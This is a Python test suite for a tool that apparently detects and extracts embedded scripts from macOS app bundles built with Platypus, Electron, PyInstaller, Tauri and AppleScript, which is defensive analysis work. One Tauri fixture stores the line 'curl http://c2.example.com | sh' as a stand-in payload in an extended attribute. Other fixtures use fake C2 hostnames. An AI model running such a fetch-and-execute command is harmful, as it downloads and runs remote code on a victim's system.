import marshal
import os
import plistlib
import shutil
import struct
import subprocess
import sys
import tempfile
import unittest
import zlib

try:
    import brotli
except ImportError:
    brotli = None

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.join(HERE, "..", "source"))

import modules.bundle as bundle_module
import modules.electron as electron
import modules.macho as macho
import modules.osascript as osascript
import modules.platypus as platypus
import modules.pyinstaller as pyinstaller
import modules.tauri as tauri
import importlib.util

spec = importlib.util.spec_from_file_location("faux_finder_cli", os.path.join(HERE, "..", "source", "__main__.py"))
cli = importlib.util.module_from_spec(spec)
spec.loader.exec_module(cli)


def make_app(root, executable_source="/bin/ls", signature=None):
    app = os.path.join(root, "test.app")
    os.makedirs(os.path.join(app, "Contents", "MacOS"))
    os.makedirs(os.path.join(app, "Contents", "Resources"))
    shutil.copy(executable_source, os.path.join(app, "Contents", "MacOS", "test"))
    info = {"CFBundleExecutable": "test"}
    if signature:
        info["CFBundleSignature"] = signature
    with open(os.path.join(app, "Contents", "Info.plist"), "wb") as f:
        plistlib.dump(info, f)
    return app


def build_carchive(script_source, module_source):
    """A minimal PyInstaller archive: bootloader stub + entry script + PYZ + TOC + cookie."""
    code = marshal.dumps(compile(script_source, "entry", "exec"))
    module = zlib.compress(b"\x00" * 16 + marshal.dumps(compile(module_source, "mod", "exec")))
    toc = {"helper_mod": (0, 12, len(module))}
    toc_blob = marshal.dumps(toc)
    pyz = b"PYZ\x00" + b"\x00" * 4 + struct.pack("!i", 12 + len(module)) + module + toc_blob
    blobs = [("entry", b"s", code), ("PYZ.pyz", b"z", pyz)]
    body, entries = b"", b""
    for entry_name, type_code, blob in blobs:
        packed = zlib.compress(blob)
        raw_name = entry_name.encode() + b"\x00"
        entries += struct.pack("!iIIIBc", 18 + len(raw_name), len(body), len(packed), len(blob), 1, type_code) + raw_name
        body += packed
    toc_offset = len(body)
    pkg_len = len(body) + len(entries) + 88
    cookie = struct.pack("!8sIIii64s", pyinstaller.COOKIE_MAGIC, pkg_len, toc_offset, len(entries), 311, b"libpython3.11.dylib")
    return b"\xde\xad" * 50 + body + entries + cookie + b"SIGNATURE-TAIL" * 10


class TempDirTest(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.mkdtemp()
        self.addCleanup(shutil.rmtree, self.tmp)


class MachOTest(unittest.TestCase):
    def test_dylibs_of_system_binary(self):
        self.assertTrue(any("libSystem" in d for d in macho.dylibs("/bin/ls")))

    def test_dylibs_of_non_macho(self):
        self.assertEqual(macho.dylibs(os.path.join(HERE, "a.xml")), [])

    def test_fat_binary(self):
        fixture = os.path.join(HERE, "pls.app", "Contents", "MacOS", "Platypus Test")
        self.assertTrue(any("Foundation" in d or "Cocoa" in d for d in macho.dylibs(fixture)))


class PlatypusTest(TempDirTest):
    def test_detects_fixture(self):
        evidence = platypus.detect(bundle_module.Bundle(os.path.join(HERE, "pls.app")))
        self.assertTrue(any("Platypus-5" in e for e in evidence))
        self.assertTrue(any("InterpreterPath" in e for e in evidence))

    def test_extracts_script(self):
        app = bundle_module.Bundle(os.path.join(HERE, "pls.app"))
        written = platypus.extract(app, self.tmp)
        with open(written[0]) as f:
            self.assertTrue(f.read().startswith("#!/usr/bin/env python3"))

    def test_lone_script_file_is_not_enough(self):
        app = make_app(self.tmp)
        open(os.path.join(app, "Contents", "Resources", "script"), "w").close()
        self.assertEqual(platypus.detect(bundle_module.Bundle(app)), [])


class ElectronTest(TempDirTest):
    def make_electron(self):
        app = make_app(self.tmp)
        os.makedirs(os.path.join(app, "Contents", "Frameworks", "Electron Framework.framework"))
        shutil.copy(os.path.join(HERE, "fixtures", "app.asar"),
                    os.path.join(app, "Contents", "Resources", "app.asar"))
        return bundle_module.Bundle(app)

    def test_detects(self):
        self.assertTrue(electron.detect(self.make_electron()))

    def test_extracts_asar(self):
        out = os.path.join(self.tmp, "out")
        electron.extract(self.make_electron(), out)
        with open(os.path.join(out, "main.js")) as f:
            self.assertEqual(f.read().strip(), 'console.log("payload")')
        self.assertTrue(os.path.isfile(os.path.join(out, "lib", "a.js")))

    def test_plain_app_is_not_electron(self):
        self.assertEqual(electron.detect(bundle_module.Bundle(make_app(self.tmp))), [])


class PyInstallerTest(TempDirTest):
    def make_pyinstaller(self):
        app = make_app(self.tmp)
        with open(os.path.join(app, "Contents", "MacOS", "test"), "wb") as f:
            f.write(build_carchive("print('c2.example.com')", "VALUE = 'helper'"))
        return bundle_module.Bundle(app)

    def test_detects(self):
        self.assertIn("PyInstaller archive cookie (MEI) found in the binary",
                      pyinstaller.detect(self.make_pyinstaller()))

    def test_extracts_entry_script_and_modules(self):
        out = os.path.join(self.tmp, "out")
        pyinstaller.extract(self.make_pyinstaller(), out)
        with open(os.path.join(out, "entry.pyc"), "rb") as f:
            header = f.read(16)
            code = marshal.loads(f.read())
        self.assertEqual(header[:4], struct.pack("<H", 3495) + b"\r\n")
        self.assertIn("c2.example.com", code.co_consts)
        self.assertTrue(os.path.isfile(os.path.join(out, "PYZ.pyz_extracted", "helper_mod.pyc")))

    def test_plain_app_is_not_pyinstaller(self):
        self.assertEqual(pyinstaller.detect(bundle_module.Bundle(make_app(self.tmp))), [])


class TauriTest(TempDirTest):
    def make_tauri(self, payload=b"curl http://c2.example.com | sh"):
        app = make_app(self.tmp)
        executable = os.path.join(app, "Contents", "MacOS", "test")
        with open(executable, "wb") as f:
            f.write(b"\x00error while running tauri application\x00tauri.conf.json\x00")
        subprocess.run(["xattr", "-w", "test", payload.decode(), executable], check=True)
        return bundle_module.Bundle(app)

    def test_detects_strings_and_xattr(self):
        evidence = tauri.detect(self.make_tauri())
        self.assertTrue(any("tauri.conf.json" in e for e in evidence))
        self.assertTrue(any("extended attribute 'test'" in e for e in evidence))

    def test_extracts_xattr_payload(self):
        out = os.path.join(self.tmp, "out")
        tauri.extract(self.make_tauri(), out)
        with open(os.path.join(out, "xattr_test"), "rb") as f:
            self.assertEqual(f.read(), b"curl http://c2.example.com | sh")

    def test_single_string_is_not_enough(self):
        app = make_app(self.tmp)
        with open(os.path.join(app, "Contents", "MacOS", "test"), "wb") as f:
            f.write(b"see tauri.conf.json")
        self.assertEqual(tauri.detect(bundle_module.Bundle(app)), [])

    def test_plain_app_is_not_tauri(self):
        self.assertEqual(tauri.detect(bundle_module.Bundle(make_app(self.tmp))), [])


@unittest.skipUnless(brotli, "brotli not installed")
class TauriAssetTest(TempDirTest):
    def make_tauri(self, blob):
        app = make_app(self.tmp)
        noise = bytes((i * 37 + 11) % 256 for i in range(3000))
        with open(os.path.join(app, "Contents", "MacOS", "test"), "wb") as f:
            f.write(noise + blob + noise + b"error while running tauri application\x00tauri://\x00")
        return bundle_module.Bundle(app)

    def test_extracts_real_embedded_assets(self):
        with open(os.path.join(HERE, "fixtures", "tauri_assets.br"), "rb") as f:
            blob = f.read()
        out = os.path.join(self.tmp, "out")
        written = tauri.extract(self.make_tauri(blob), out)
        contents = {os.path.splitext(w)[1]: open(w, "rb").read() for w in written}
        self.assertIn(b"<script src=\"main.js\">", contents[".html"])
        self.assertIn(b"c2.faux-finder.example", contents[".js"])
        self.assertEqual(len(written), 2)

    def test_no_streams_in_noise(self):
        self.assertEqual(tauri.extract(self.make_tauri(b""), os.path.join(self.tmp, "out")), [])


@unittest.skipUnless(shutil.which("osacompile"), "osacompile not available")
class OsascriptTest(TempDirTest):
    def compile(self, *flags):
        app = os.path.join(self.tmp, "osa.app")
        subprocess.run(["osacompile", *flags, "-o", app, "-e", 'do shell script "echo hi"'],
                       check=True, capture_output=True)
        return bundle_module.Bundle(app)

    def test_detects(self):
        self.assertTrue(osascript.detect(self.compile()))

    def test_extracts_source(self):
        written = osascript.extract(self.compile(), os.path.join(self.tmp, "out"))
        sources = [w for w in written if w.endswith(".applescript")]
        with open(sources[0]) as f:
            self.assertIn("echo hi", f.read())

    def test_run_only_keeps_compiled_script(self):
        written = osascript.extract(self.compile("-x"), os.path.join(self.tmp, "out"))
        self.assertEqual([os.path.basename(w) for w in written], ["main.scpt"])


class CliTest(TempDirTest):
    def test_exit_codes(self):
        self.assertEqual(cli.main([os.path.join(HERE, "pls.app")]), 0)
        self.assertEqual(cli.main([make_app(self.tmp)]), 1)
        with self.assertRaises(SystemExit) as raised:
            cli.main([os.path.join(HERE, "a.xml")])
        self.assertEqual(raised.exception.code, 2)
        with self.assertRaises(SystemExit) as raised:
            cli.main([os.path.join(self.tmp, "missing.app")])
        self.assertEqual(raised.exception.code, 2)

    def test_output_directory(self):
        out = os.path.join(self.tmp, "out")
        cli.main([os.path.join(HERE, "pls.app"), "-o", out])
        self.assertTrue(os.path.isfile(os.path.join(out, "platypus", "script")))


if __name__ == "__main__":
    unittest.main()
